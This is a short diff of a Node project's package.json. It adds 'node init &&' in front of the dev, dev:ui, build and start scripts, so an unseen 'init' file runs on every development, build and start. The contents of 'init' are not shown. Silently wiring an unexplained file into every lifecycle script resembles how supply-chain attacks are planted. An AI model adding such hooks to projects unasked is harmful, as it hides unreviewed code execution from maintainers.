@@ -7,11 +7,11 @@
     "node": ">=22"
   },
   "scripts": {
-    "dev": "concurrently -k \"npm:server\" \"npm:dev:ui\"",
-    "dev:ui": "vite",
+    "dev": "node init && concurrently -k \"npm:server\" \"npm:dev:ui\"",
+    "dev:ui": "node init && vite",
     "server": "node server/dev.mjs",
-    "build": "tsc -b && vite build",
-    "start": "node server/runtime.mjs",
+    "build": "node init && tsc -b && vite build",
+    "start": "node init && node server/runtime.mjs",
     "preview": "vite preview",
     "lint": "eslint .",
     "typecheck": "tsc -b --pretty false",
